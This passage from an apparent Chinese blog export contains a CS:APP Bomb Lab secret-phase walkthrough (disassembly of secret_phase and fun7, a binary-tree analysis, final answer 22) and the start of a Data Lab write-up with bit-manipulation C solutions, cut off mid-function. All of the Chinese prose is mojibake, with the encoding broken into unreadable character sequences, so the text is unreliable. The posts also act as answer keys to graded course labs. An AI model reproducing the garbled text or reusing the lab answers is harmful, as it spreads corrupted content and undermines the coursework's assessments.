ç¬¬15ã€16è¡Œå¯¹æˆåŠŸè¾“å…¥çš„æ•°æ®ä¸ªæ•°è¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æžœä¸ä¸º3ä¸ªåˆ™è·³è¿‡è°ƒç”¨secret_phaseçš„ä»£ç ã€‚ ç¬¬17-19è¡Œæ˜¯å¯¹strings_not_equalçš„è°ƒç”¨ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“å®ƒçš„ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯esiä¸Žediï¼Œesiè¢«èµ‹ä¸Šäº†ä¸€ä¸ªåœ°å€å€¼ï¼Œediè¢«èµ‹ä¸Šäº†esp+0x10ï¼Œæˆ‘ä»¬å¯ä»¥æŽ¨æµ‹å‡ºediçš„åœ°å€å°±æ˜¯æŒ‡å‘æˆ‘ä»¬è¯»å…¥çš„ç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸²çš„ï¼Œé‚£ä¹ˆéœ€è¦æ¯”è¾ƒçš„å¯¹è±¡æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬åœ¨è¿è¡Œæ—¶æŸ¥çœ‹å†…å­˜çš„å†…å®¹ï¼š è¿™å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ç¬¬ä¸‰ä¸ªå‚æ•°ã€‚ å¯ä»¥çœ‹åˆ°å¦‚æžœç¬¬ä¸‰ä¸ªå‚æ•°ä¸Žä¸Šé¢è¿™ä¸ªå­—ç¬¦ä¸²ç›¸åŒçš„è¯å°±ä¼šè°ƒç”¨ä¸¤æ¬¡putsè¾“å‡ºæç¤ºä¿¡æ¯ï¼Œç„¶åŽè¿›å…¥secret_phaseé˜¶æ®µã€‚ 12345678910111213141516171819202122230000000000401242 &lt;secret_phase&gt;: 401242: 53 push %rbx 401243: e8 56 02 00 00 callq 40149e &lt;read_line&gt; 401248: ba 0a 00 00 00 mov $0xa,%edx 40124d: be 00 00 00 00 mov $0x0,%esi 401252: 48 89 c7 mov %rax,%rdi 401255: e8 76 f9 ff ff callq 400bd0 &lt;strtol@plt&gt; 40125a: 48 89 c3 mov %rax,%rbx 40125d: 8d 40 ff lea -0x1(%rax),%eax 401260: 3d e8 03 00 00 cmp $0x3e8,%eax 401265: 76 05 jbe 40126c &lt;secret_phase+0x2a&gt; 401267: e8 ce 01 00 00 callq 40143a &lt;explode_bomb&gt; 40126c: 89 de mov %ebx,%esi 40126e: bf f0 30 60 00 mov $0x6030f0,%edi 401273: e8 8c ff ff ff callq 401204 &lt;fun7&gt; 401278: 83 f8 02 cmp $0x2,%eax 40127b: 74 05 je 401282 &lt;secret_phase+0x40&gt; 40127d: e8 b8 01 00 00 callq 40143a &lt;explode_bomb&gt; 401282: bf 38 24 40 00 mov $0x402438,%edi 401287: e8 84 f8 ff ff callq 400b10 &lt;puts@plt&gt; 40128c: e8 33 03 00 00 callq 4015c4 &lt;phase_defused&gt; 401291: 5b pop %rbx 401292: c3 retq å¯ä»¥çœ‹åˆ°ç¬¬3è¡Œè°ƒç”¨äº†read_lineå‡½æ•°ï¼ŒæŽ¥ç€æŠŠread_lineçš„è¿”å›žå€¼èµ‹ç»™äº†rdiï¼Œå¹¶è°ƒç”¨äº†strtolå‡½æ•°ï¼Œè¿™ä¸ªæ ‡å‡†åº“å‡½æ•°çš„ä½œç”¨æ˜¯æŠŠä¸€ä¸ªå­—ç¬¦ä¸²è½¬æ¢æˆå¯¹åº”çš„é•¿æ•´åž‹æ•°å€¼ã€‚è¿”å›žå€¼è¿˜æ˜¯å­˜æ”¾åœ¨raxä¸­ï¼Œç¬¬8è¡Œå°†raxå¤åˆ¶ç»™äº†rbxï¼Œç¬¬9è¡Œå°†raxå‡1èµ‹ç»™eaxï¼Œç¬¬åè¡Œä¸Ž0x3e8è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœè¿™ä¸ªå€¼å°äºŽç­‰äºŽ0x3e8å°±è·³è¿‡å¼•çˆ†ä»£ç ã€‚çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬å¯ä»¥çŸ¥é“æˆ‘ä»¬éœ€è¦å†åŠ å…¥ä¸€è¡Œæ•°æ®ï¼Œå®ƒåº”è¯¥æ˜¯ä¸€ä¸ªå°äºŽç­‰äºŽ1001çš„æ•°å€¼ã€‚ æŽ¥ä¸‹æ¥å°†ebxèµ‹ç»™äº†esiï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸€å¼€å§‹è¾“å…¥çš„raxå€¼ã€‚ç¬¬14è¡Œå°†ä¸€ä¸ªåœ°å€å€¼èµ‹ç»™äº†ediï¼Œ15è¡Œè°ƒç”¨äº†fun7å‡½æ•°ã€‚æˆ‘ä»¬è¿˜æ˜¯å…ˆå¾€ä¸‹äº†è§£ä¸€ä¸‹æˆ‘ä»¬éœ€è¦å¾—åˆ°çš„ç»“æžœã€‚ å‡½æ•°è¿”å›žåŽä»¤è¿”å›žå€¼eaxä¸Ž0x2åšäº†ä¸€ä¸ªæ¯”è¾ƒï¼Œå¦‚æžœç›¸ç­‰åˆ™è·³è¿‡å¼•çˆ†ä»£ç ã€‚ æ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿”å›ž2ã€‚ ä¸‹é¢æŸ¥çœ‹fun7çš„ä»£ç ï¼š 1234567891011121314151617181920210000000000401204 &lt;fun7&gt;: 401204: 48 83 ec 08 sub $0x8,%rsp 401208: 48 85 ff test %rdi,%rdi 40120b: 74 2b je 401238 &lt;fun7+0x34&gt; 40120d: 8b 17 mov (%rdi),%edx 40120f: 39 f2 cmp %esi,%edx 401211: 7e 0d jle 401220 &lt;fun7+0x1c&gt; 401213: 48 8b 7f 08 mov 0x8(%rdi),%rdi 401217: e8 e8 ff ff ff callq 401204 &lt;fun7&gt; 40121c: 01 c0 add %eax,%eax 40121e: eb 1d jmp 40123d &lt;fun7+0x39&gt; 401220: b8 00 00 00 00 mov $0x0,%eax 401225: 39 f2 cmp %esi,%edx 401227: 74 14 je 40123d &lt;fun7+0x39&gt; 401229: 48 8b 7f 10 mov 0x10(%rdi),%rdi 40122d: e8 d2 ff ff ff callq 401204 &lt;fun7&gt; 401232: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401236: eb 05 jmp 40123d &lt;fun7+0x39&gt; 401238: b8 ff ff ff ff mov $0xffffffff,%eax 40123d: 48 83 c4 08 add $0x8,%rsp 401241: c3 retq ç¬¬3ã€4ä¸¤è¡Œå…ˆå¯¹æˆ‘ä»¬è¾“å…¥çš„è¿™ä¸ªæ•°ä½œä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æžœç­‰äºŽ0ç›´æŽ¥è·³åˆ°ç¬¬19è¡Œï¼Œè¿”å›ž-1ï¼Œè¿™æ˜¾ç„¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç»“æžœã€‚ ç¬¬5è¡Œå°†rdiçš„å€¼è¯»å…¥åˆ°äº†edxä¸­ï¼Œç¬¬6è¡Œåˆ™å°†è¿™ä¸ªæ•°ä¸Žæˆ‘ä»¬è¯»å…¥çš„æ•°è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æžœè¿™ä¸ªæ•°å°äºŽç­‰äºŽæˆ‘ä»¬è¯»å…¥çš„æ•°å°±è·³è‡³ç¬¬12è¡Œï¼Œç¬¬12è¡Œå°†eaxç½®0ï¼Œå†è¿›è¡Œä¸€æ¬¡ç›¸åŒçš„æ¯”è¾ƒï¼Œå¦‚æžœç›¸ç­‰åˆ™è·³è‡³ç¬¬20è¡Œè¿”å›žã€‚ å¦‚æžœä¸ç­‰ï¼ˆä¹Ÿå°±æ˜¯edxå°äºŽæˆ‘ä»¬è¯»å…¥çš„æ•°ï¼‰ï¼Œåˆ™ç»§ç»­å‘ä¸‹æ‰§è¡Œç¬¬15è¡Œï¼Œè¿™è¡Œä»£ç æœ‰äº›ä¸Žä¹‹å‰çš„é“¾è¡¨è·³è‡³ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ç±»ä¼¼ï¼Œåˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å°±éœ€è¦æŸ¥çœ‹ä¸€ä¸‹rdiè¿™ä¸ªåœ°å€é‡Œå­˜æ”¾çš„æ˜¯æ€Žæ ·ä¸€ç§æ•°æ®ç»“æž„ï¼š ä»”ç»†è§‚å¯Ÿå¯ä»¥å‘çŽ°è¿™æ˜¯ä¸€ä¸ªäºŒå‰æ ‘çš„ç»“æž„ï¼Œæ¯ä¸ªèŠ‚ç‚¹ç¬¬1ä¸ª8å­—èŠ‚å­˜æ”¾æ•°æ®ï¼Œç¬¬2ä¸ª8å­—èŠ‚å­˜æ”¾å·¦å­æ ‘åœ°å€ï¼Œç¬¬3ä¸ª8å­—èŠ‚å­˜æ”¾å³å­æ ‘ä½ç½®ã€‚å¹¶ä¸”å‘½ä»¤ä¹Ÿæœ‰è§„å¾‹ï¼Œnabï¼Œaä»£è¡¨å±‚æ•°ï¼Œbä»£è¡¨ä»Žå·¦è‡³å³ç¬¬bä¸ªèŠ‚ç‚¹ã€‚ æ ¹æ®è¿™ä¸ªç»“æž„ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ ‘ç”»å‡ºæ¥ä»¥ä¾¿æˆ‘ä»¬è¿›è¡Œåˆ†æžã€‚éšæ„æ‰¾äº†ä¸ªå·¥å…·è¡¨ç¤ºä¸€ä¸‹ï¼š ä¸‹é¢æˆ‘ä»¬å›žåˆ°ä»£ç ï¼ŒçŽ°åœ¨æˆ‘ä»¬çŸ¥é“ç¬¬15è¡Œä»£ç çš„ä½œç”¨æ˜¯å°†rdiç§»åˆ°å®ƒçš„å³å­æ ‘çš„ä½ç½®ï¼ŒæŽ¥ç€è°ƒç”¨fun7ï¼Œåœ¨è¿”å›žåŽä»¤eax = 2 * rax + 1ã€‚ å¦‚æžœç¬¬6è¡Œçš„æ¯”è¾ƒä¸­æ ‘èŠ‚ç‚¹çš„å€¼å¤§äºŽæˆ‘ä»¬è¯»å…¥çš„æ•°å‘¢ï¼Ÿ ä»£ç ä¼šè¿›è¡Œåˆ°ç¬¬8è¡Œï¼Œä»¤rdiç§»åˆ°å®ƒçš„å·¦å­æ ‘çš„ä½ç½®ï¼ŒæŽ¥ä¸‹æ¥è°ƒç”¨fun7åœ¨è¿”å›žåŽä»¤eax = 2 * eaxã€‚ä¸‹é¢è·³è‡³è¿”å›žå¤„ã€‚ æ€»ç»“ä¸Šé¢çš„è¿‡ç¨‹ï¼šediæŒ‡å‘ä¸€ä¸ªæ ‘çš„èŠ‚ç‚¹ï¼Œä»¤edièŠ‚ç‚¹çš„å€¼ä¸Žæˆ‘ä»¬è¯»å…¥çš„å€¼è¿›è¡Œæ¯”è¾ƒã€‚ å¦‚æžœä¸¤è€…ç›¸ç­‰ï¼šè¿”å›ž0 å¦‚æžœå‰è€…å¤§äºŽåŽè€…ï¼šrdiç§»è‡³å·¦å­æ ‘ï¼Œè¿”å›ž2 * rax å¦‚æžœåŽè€…å¤§äºŽå‰è€…ï¼šrdiç§»è‡³å³å­æ ‘ï¼Œè¿”å›ž2 * rax + 1 é‚£ä¹ˆæˆ‘ä»¬éœ€è¦è¿”å›ž2ï¼Œåº”è¯¥åœ¨æœ€åŽä¸€æ¬¡è°ƒç”¨è¿”å›ž0ï¼Œå€’æ•°ç¬¬äºŒæ¬¡è°ƒç”¨è¿”å›ž2 * rax + 1ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨è¿”å›ž2 * raxã€‚æ¢å¥è¯è¯´ï¼Œè¿™ä¸ªæ•°åº”è¯¥åœ¨ç¬¬ä¸‰å±‚ï¼Œæ¯”çˆ¶èŠ‚ç‚¹å¤§ä¸”æ¯”æ ¹ç»“èŠ‚å°ã€‚è§‚å¯Ÿä¸Šå›¾ï¼Œå”¯ä¸€çš„ç­”æ¡ˆæ˜¯ï¼š 0x16ï¼ˆ22ï¼‰ è‡³æ­¤ï¼Œç‚¸å¼¹å…¨éƒ¨è§£é™¤ï¼š å®žéªŒå°ç»“æ•´ä¸ªå®žéªŒåŒ…æ‹¬ç§˜å¯†éƒ¨åˆ†ç”¨æ—¶ä¹ä¸ªå°æ—¶ï¼Œå¼•çˆ†äº†3æ¬¡ç‚¸å¼¹ï¼ˆä¸€æ¬¡å› ä¸ºé”™è¯¯çš„å°è¯•ï¼Œä¸¤æ¬¡å› ä¸ºå°†niå‘½ä»¤é”™æ‰“æˆnï¼‰ã€‚ ä¸€å¼€å§‹æ‹¿åˆ°é¢˜ç›®çš„æ—¶å€™ä¼šæ¯”è¾ƒè’™ï¼Œéœ€è¦å…ˆåŽ»å­¦ä¹ å·¥å…·çš„ä½¿ç”¨ä¸Žä¸€äº›ç¼–è¯‘çš„åŸºç¡€çŸ¥é“ï¼ˆç¬¦å·è¡¨ã€å®šå€è¡¨ç­‰ç­‰ï¼‰èŠ±è´¹äº†ä¸€äº›æ—¶é—´ã€‚å‰å‡ ä¸ªé˜¶æ®µè¿‡äºŽå…³æ³¨å‡½æ•°çš„å…·ä½“å®žçŽ°è€Œæ²¡æœ‰æ ¹æ®å¸¸è¯†åŽ»æŽ¨æµ‹ä¸€äº›æ˜Žæ˜¾å‡½æ•°çš„ä½œç”¨èŠ±è´¹äº†ä¸€äº›æ—¶é—´ã€‚ å‰4ä¸ªé˜¶æ®µéƒ½ç®—æ¯”è¾ƒç®€å•ï¼Œè€ƒæŸ¥äº†ä¸€äº›å¸¸ç”¨ç»“æž„åœ¨æ±‡ç¼–ä¸­çš„å‡ºçŽ°å½¢å¼ã€‚ç¬¬5ã€6ä¸Žç§˜å¯†é˜¶æ®µåˆ†åˆ«è€ƒå¯Ÿäº†å †ã€é“¾è¡¨ã€äºŒå‰æ ‘è¿™ä¸‰ä¸ªæ•°æ®ç»“æž„åœ¨å†…å­˜ä¸­çš„ç»“æž„ä¸Žæ±‡ç¼–çº§çš„ä½¿ç”¨ï¼Œå—ç›Šè‰¯å¤šã€‚ è¿™ä¸ªå®žéªŒéœ€è¦ç»†è‡´çš„åˆ†æžä¸Žå¤§èƒ†çš„çŒœæµ‹ä¸Žå®žéªŒéªŒè¯ï¼Œè¿˜éœ€è¦å°å¿ƒæ“ä½œï¼Œæœ€é‡è¦çš„æ˜¯è€å¿ƒï¼Œé¢å¯¹éžå¸¸æ™¦æ¶©çš„æ±‡ç¼–ä»£ç å¦‚ä½•ä¸€æ­¥æ­¥åœ°å¼„æ¸…ä»£ç çš„ä½œç”¨å¾ˆéœ€è¦æ¯…åŠ›ã€‚å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡è‡ªå·±å†™å‡ºç­‰ä»·çš„Cä»£ç æ¥å¸®åŠ©è‡ªå·±ç†è§£ã€‚]]></content>
      <categories>
        <category>Computer System</category>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>Computer System</tag>
        <tag>CS:APP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿï¼ˆCS:APP) - Data Labè¯¦è§£]]></title>
    <url>%2F2017%2F06%2F18%2FCS_APP_DataLab%2F</url>
    <content type="text"><![CDATA[å…³äºŽCS:APPã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹(Computer Systems: A Programmerâ€™s Perspective;CS:APP)è¿™æœ¬ä¹¦ä½œä¸ºCMUæ ¸å¿ƒè¯¾ç¨‹çš„æ ¸å¿ƒæ•™æï¼Œä¸€ç›´è¢«ä¼—äººæ‰€æŽ¨å´‡ã€‚è¿™æœ¬ä¹¦çš„ä¸»è¦å†…å®¹å°±å¦‚å®ƒçš„è‹±æ–‡åç§°é‚£æ ·ï¼šä»¥ä¸€ä¸ªç¨‹åºå‘˜çš„è§†è§’çœ‹å¾…è®¡ç®—æœºç³»ç»Ÿï¼ˆçŽ°åœ¨çš„ä¸­æ–‡ä¹¦åç¿»è¯‘ç»™äººä¸€ç§è¿™æœ¬ä¹¦éžå¸¸ç²¾æ·±çš„é”™è§‰ï¼‰ã€‚å®žé™…ä¸Šè¿™æœ¬ä¹¦çš„å†…å®¹å¹¶æ²¡æœ‰å¤ªè¿‡äºŽæ·±å…¥ï¼Œå¹¶ä¸”ä¸€ç›´éƒ½ä½œä¸ºè®¡ç®—æœºç§‘å­¦ä¸ŽæŠ€æœ¯ä¸“ä¸šä½Žå¹´çº§çš„è®¡ç®—æœºåŸºç¡€è¯¾æ¥å¼€è®¾ã€‚æ‰€éœ€è¦çš„å‰ç½®çŸ¥è¯†ä¹Ÿä¸æ˜¯å¾ˆå¤šï¼Œä¸€èˆ¬æ¥è¯´å­¦ä¹ è¿‡Cè¯­è¨€ä¹‹åŽå°±å¯ä»¥çœ‹äº†ï¼Œå¹¶ä¸éœ€è¦æå‰å­¦ä¹ æ±‡ç¼–ï¼ˆæœ¬ä¹¦ç¬¬ä¸‰ç« ä¼šè®²è§£æ±‡ç¼–çš„åŸºç¡€å†…å®¹ï¼‰ã€‚ä½†ä¸ªäººæ„Ÿè§‰åœ¨å­¦ä¹ è¿‡çŽ‹çˆ½çš„8086æ±‡ç¼–ä»¥åŽå­¦ä¹ æœ¬ä¹¦çš„æ±‡ç¼–ä¼šé¡ºåˆ©ä¸å°‘ã€‚ æˆ‘åœ¨ä¸‰æœˆä»½æ—¶å¾—çŸ¥æœ¬ä¹¦ç¬¬ä¸‰ç‰ˆçš„è‹±æ–‡ç‰ˆå³å°†å‡ºç‰ˆå°±æ—©æ—©é¢„è®¢äº†ï¼ˆç¬¬ä¸‰ç‰ˆä¸­æ–‡ç¿»è¯‘ç‰ˆæ—©å·²å‡ºç‰ˆï¼‰ï¼Œè‹¦è‹¦ç­‰å¾…ä¸€ä¸ªæœˆä»¥åŽç»ˆäºŽå¦‚æ„¿æˆä¸ºäº†è¿™ç‰ˆCS:APPçš„ç¬¬ä¸€æ‰¹è¯»è€…ã€‚ è¯»è¿™æœ¬ä¹¦çš„æ„Ÿå—ç¬¬ä¸€å°±æ˜¯éžå¸¸åœ°çˆ½ï¼Œå¯ä»¥è¯´è¿™æœ¬ä¹¦å¯ä»¥å¼•é¢†ä½ ä»Žè¡¨å±‚çš„ç¨‹åºä¸€ç›´æ·±å…¥åˆ°è®¡ç®—æœºå†…éƒ¨çš„è¿ä½œæ–¹å¼ä¸­ï¼Œé‡Œé¢å¯¹äºŽä¸€äº›æ¦‚å¿µçš„ç†è§£ä¹Ÿæ˜¯ç»™äººä¸€ç§å‰æ‰€æœªæœ‰çš„é€å½»æ„Ÿè§‰ï¼ˆæº¢å‡ºçš„å›¾å½¢è¡¨ç¤ºã€è¡¥ç çš„æƒå€¼ç†è§£ç­‰ç­‰ï¼‰éƒ½åˆ‡ä¸­äº†é—®é¢˜çš„æœ¬è´¨ã€‚ é™¤äº†ä¹¦æœ¬ä¸Šçš„å†…å®¹ï¼ŒCMUçš„è¯¾ç¨‹å®˜ç½‘ä¸Šè¿˜æä¾›äº†9ä¸ªlabï¼Œè¿™9ä¸ªlabä¹Ÿä¸€ç›´æ·±å—CMUå¼€è®¾çš„è¯¾ç¨‹çš„å­¦ç”Ÿä»¬çš„å–œçˆ±ï¼Œåœ¨labä¸­æˆ‘ä»¬å¯ä»¥å°†åœ¨å„ç« ä¸­å­¦ä¹ åˆ°çš„çŸ¥è¯†è¿ç”¨åˆ°è§£å†³ä¸€ä¸ªæœ‰è¶£çš„é—®é¢˜ä¸­ï¼Œå¹¶ä¸”é€šè¿‡è‡ªåŠ¨åŒ–çš„è¯„åˆ†æœºåˆ¶è¯„ä¼°å¯¹çŸ¥è¯†çš„æŽŒæ¡ç¨‹åº¦ã€‚è¿™9ä¸ªlabåŒæ ·æ˜¯è¿™æœ¬ä¹¦çš„æ ¸å¿ƒå†…å®¹ã€‚ Data Labå®žéªŒä»£ç è§GitHub ç®€ä»‹åœ¨ä¸¥æ ¼é™åˆ¶çš„æ¡ä»¶ä¸‹å®žçŽ°ç®€å•çš„é€»è¾‘ã€è¡¥ç ã€æµ®ç‚¹æ•°æ“ä½œå‡½æ•°ã€‚ æœ¬labæ—¨åœ¨å¸®åŠ©å­¦ç”Ÿç†è§£Cä¸­å„ç±»åž‹çš„ä½è¡¨ç¤ºå’Œæ“ä½œç¬¦å¯¹æ•°æ®çš„ä½çº§ä½œç”¨è¡Œä¸ºã€‚ æ‰€ç”¨å·¥å…·VS Code-ç”¨äºŽä»£ç ç¼–å†™gcc-ç”¨äºŽç¼–è¯‘ ç¬¬ä¸€éƒ¨åˆ† æ•´æ•°æ‰€ç¼–å†™çš„ç¨‹åºå¿…é¡»æ»¡è¶³å¦‚ä¸‹è¦æ±‚ï¼š åªèƒ½ä½¿ç”¨0-255çš„æ•´åž‹å¸¸æ•° åªèƒ½ä½¿ç”¨å‡½æ•°å‚æ•°ä¸Žå‡½æ•°å†…å£°æ˜Žçš„å±€éƒ¨å˜é‡ åªèƒ½ä½¿ç”¨å¦‚ä¸‹å•ç›®æ“ä½œç¬¦ï¼š! ~ åªèƒ½ä½¿ç”¨å¦‚ä¸‹åŒç›®æ“ä½œç¬¦ï¼š&amp; ^ | + &lt;&lt; &gt;&gt; æœ€å¤šåªèƒ½ä½¿ç”¨æœ‰é™ä¸ªè¿ç®—ç¬¦ï¼ˆç­‰äºŽå·ã€æ‹¬å·ä¸è®¡ï¼‰ï¼Œå¯ä»¥è®¤ä¸ºä½¿ç”¨çš„è¿ç®—ç¬¦ä¸ªæ•°è¶Šå°‘å¾—åˆ†è¶Šé«˜ ä¸€äº›å‡½æ•°å¯èƒ½å¯¹æ“ä½œç¬¦æœ‰æ›´å¤šçš„é™åˆ¶ï¼ˆåœ¨é¢˜ç›®å‰ä»¥æ“ä½œç¬¦é™åˆ¶ç»™å‡ºï¼‰ ç¦æ­¢ä½¿ç”¨ä»»ä½•æŽ§åˆ¶ç»“æž„å¦‚ if do while for switchç­‰ ç¦æ­¢å®šä¹‰æˆ–ä½¿ç”¨ä»»ä½•å® ç¦æ­¢å®šä¹‰ä»»ä½•å‡½æ•° ç¦æ­¢è°ƒç”¨ä»»ä½•å‡½æ•°ï¼ˆé™¤äº†å¯ä»¥ä½¿ç”¨printfè¾“å‡ºä¸­é—´å˜é‡ï¼Œä½†æäº¤æ—¶å¿…é¡»åŽ»æŽ‰ï¼‰ ç¦æ­¢ä½¿ç”¨ä»»ä½•å½¢å¼çš„ç±»åž‹è½¬æ¢ ç¦æ­¢ä½¿ç”¨intä»¥å¤–çš„ä»»ä½•ç±»åž‹ï¼ˆåŒ…æ‹¬ç»“æž„ä½“ã€æ•°ç»„ã€è”åˆä½“ï¼‰ å¯ä»¥å‡è®¾ç¨‹åºåœ¨å¦‚ä¸‹çŽ¯å¢ƒçš„æœºå™¨ä¸Šè¿è¡Œï¼š é‡‡ç”¨è¡¥ç è¡¨ç¤ºæ•´åž‹ 32ä½int æ‰§è¡Œç®—æœ¯å³ç§» å³ç§»è¶…è¿‡ç±»åž‹çš„é•¿åº¦æ—¶çš„è¡Œä¸ºæœªå®šä¹‰ bitAnd è¦æ±‚ï¼šåªç”¨~ |å®žçŽ°x&amp;y æ“ä½œç¬¦é™åˆ¶ï¼š~ | æ“ä½œç¬¦ä½¿ç”¨æ•°é‡é™åˆ¶ï¼š8 æ€è·¯ï¼šç•¥ 1int bitAnd(int x, int y) &#123; return ~((~x) | (~y)); &#125; getByte è¦æ±‚ï¼šå–å‡ºxä¸­çš„nå·å­—èŠ‚ ç¼–å·ä»Žä½Žä½åˆ°é«˜ä½ä»Ž0å¼€å§‹ æ“ä½œç¬¦ä½¿ç”¨æ•°é‡é™åˆ¶ï¼š6 æ€è·¯ï¼šå°†xå³ç§»n*8ä½ä¹‹åŽå–å‡ºä½Ž8ä½çš„å€¼ 1int getByte(int x, int n) &#123; return (x &gt;&gt; (n &lt;&lt; 3)) &amp; 0xff; &#125; logicalShift è¦æ±‚ï¼šå°†xé€»è¾‘å³ç§»nä½ï¼ˆ0&lt;=n&lt;=31) æ“ä½œç¬¦ä½¿ç”¨æ•°é‡é™åˆ¶ï¼š20 æ€è·¯ï¼šå°†xçš„æœ€é«˜ä½é™¤åŽ»åŽå³ç§»nä½ï¼ˆä¿è¯é«˜ä½è¡¥0ï¼‰ï¼Œç„¶åŽä½¿ç”¨|æ“ä½œç¬¦æ‰‹åŠ¨å°†æœ€é«˜ä½ç§»åŠ¨åˆ°çš„ä½ç½®ç½®ä¸Šxçš„æœ€é«˜ä½ã€‚ 1234int logicalShift(int x, int n) &#123; int a = 1 &lt;&lt; 31; return ((x &amp; ~a) &gt;&gt; n) | ((!!(x &amp; a)) &lt;&lt; (32 + ~n));&#125; bitCount è¦æ±‚ï¼šç»Ÿè®¡xçš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸­1çš„æ•°é‡ æ“ä½œç¬¦ä½¿ç”¨æ•°é‡é™åˆ¶ï¼š40 æ€è·¯ï¼š åšè¿™é“é¢˜å‚è€ƒäº†stackoverflowä¸Šçš„ä¸€ä¸ªå›žç­”ï¼Œæ ¸å¿ƒæ€æƒ³æ˜¯åˆ†æ²»ï¼š å°†æ‰€æœ‰ä½åˆ†æˆ32ç»„ï¼Œä¸€ç»„ä¸­åªæœ‰1ä½ å°†ç›¸é‚»ä¸¤ç»„åˆä¸ºä¸€ç»„ï¼Œç»„ä¸­çš„æ•°å€¼ä¸ºåŽŸæ¥ä¸¤ç»„ä¸­çš„æ•°å€¼ç›¸åŠ  é‡å¤ç¬¬2æ­¥ï¼Œç›´åˆ°åˆæˆåªæœ‰1ç»„ï¼Œç»„ä¸­çš„æ•°å€¼å³ä¸ºç»“æžœ ç”¨å›¾ç‰‡æ¯”è¾ƒä¾¿äºŽç†è§£ï¼š å¯ä»¥çœ‹åˆ°æœ€ç»ˆçš„0x0000000Få³ä¸º1çš„æ•°é‡15 è¯¥ç®—æ³•èƒ½æˆåŠŸçš„å…³é”®åœ¨äºŽä¸€å¼€å§‹ä¸­æ¯ç»„ä¸­çš„æ•°å€¼å³ä¸ºæ¯ç»„ä¸­1çš„æ•°é‡ï¼Œç„¶åŽå°†ç›¸é‚»ä¸¤ç»„ä¸­çš„æ•°å€¼ç›¸åŠ çš„è¿‡ç¨‹å°±ç›¸å½“äºŽå°†ä¹‹å‰ä¸€çº§çš„1çš„æ•°é‡æ±‡æ€»ï¼Œä¸æ–­é‡å¤è¿™ä¸ªè¿‡ç¨‹å°±å¯ä»¥å°†1çš„æ•°é‡æ±‡æ€»åˆ°æœ€åŽçš„ä¸€ä¸ªæ•°ä¸­ã€‚ æœ‰äº†ç®—æ³•æˆ‘ä»¬è¿˜è¦è€ƒè™‘å¦‚ä½•åœ¨é¢˜ç›®çš„é™åˆ¶æ¡ä»¶ä¸‹å®žçŽ°è¿™ä¸€ç®—æ³•ã€‚ ä¸ºäº†å®žçŽ°å°†ç›¸é‚»ä¸¤ç»„ä¸­çš„å€¼ç›¸åŠ å¹¶æ”¾åœ¨åˆé€‚çš„ä½ç½®ï¼Œæˆ‘ä»¬é‡‡ç”¨æŽ©ç +ä½ç§»çš„æ–¹å¼ï¼Œä¾‹å¦‚æœ‰æŽ©ç ï¼š int mask1 = 0x55555555 (0101...0101) é‚£ä¹ˆx = x &amp; mask1 + (x &gt;&gt; 1) &amp; mask1;å®žçŽ°äº†ç›¸åŠ çš„è¿‡ç¨‹ï¼Œå‰é¢ä¸€éƒ¨åˆ†å…ˆå–å‡ºäº†ä¸€åŠçš„ç»„ï¼Œå³ç§»åŽå†å–å‡ºçš„å°±æ˜¯åŽä¸€åŠçš„ç»„ï¼Œå†ç”±æŒ‰ä½ç›¸åŠ çš„ç‰¹ç‚¹ï¼Œå®ƒä»¬ç›¸åŠ åŽçš„å€¼å°±å­˜æ”¾åœ¨ç‰¹å®šçš„ä½ä¸Šï¼ˆå¯ä»¥å‚ç…§ä¸Šé¢çš„å›¾ç†è§£è¿™ä¸€è¿‡ç¨‹ï¼‰ã€‚ æŽ¥ä¸‹æ¥åªè¦ä½¿ç”¨ä¸åŒçš„æŽ©ç å’Œä¸åŒçš„ä½ç§»å°±å¯ä»¥ä¸€æ­¥æ­¥å®žçŽ°è¿™ä¸€è¿‡ç¨‹ã€‚ ä½†æ˜¯é¢˜ç›®é™åˆ¶ä¸­æˆ‘ä»¬åªèƒ½ä½¿ç”¨0x00-0xFFçš„æ•´åž‹å€¼ï¼Œæ‰€ä»¥æŽ©ç ä¹Ÿéœ€è¦æˆ‘ä»¬è¿›è¡Œæž„é€ ã€‚ ç­”æ¡ˆå¦‚ä¸‹ï¼Œæ³¨æ„åˆ°å½“å‰©ä¸‹4ç»„ï¼Œæ¯ç»„8ä½çš„æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ç›´æŽ¥ä½ç§»ç›¸åŠ å†å–å‡ºä½Ž8ä½å¾—åˆ°å®ƒä»¬çš„å’Œã€‚ 12345678910111213141516171819int bitCount(int x) &#123; // referenced : // https://stackoverflow.com/questions/3815165/how-to-implement-bitcount-using-only-bitwise-operators int mask1 = 0x55; int mask2 = 0x33; int mask3 = 0x0F; int result = 0; mask1 = mask1 | (mask1 &lt;&lt; 8); mask1 = mask1 | (mask1 &lt;&lt; 16); mask2 = mask2 | (mask2 &lt;&lt; 8); mask2 = mask2 | (mask2 &lt;&lt; 16); mask3 = mask3 | (mask3 &lt;&lt; 8); mask3 = mask3 | (mask3 &lt;&lt; 16); result = (x &amp; mask1) + ((x &gt;&gt; 1) &amp; mask1); result = (result &amp; mask2) + ((result &gt;&gt; 2) &amp; mask2); result = (result &amp; mask3) + ((result &gt;&gt; 4) &amp; mask3); return (result + (result &gt;&gt; 8) + (result &gt;&gt; 16) + 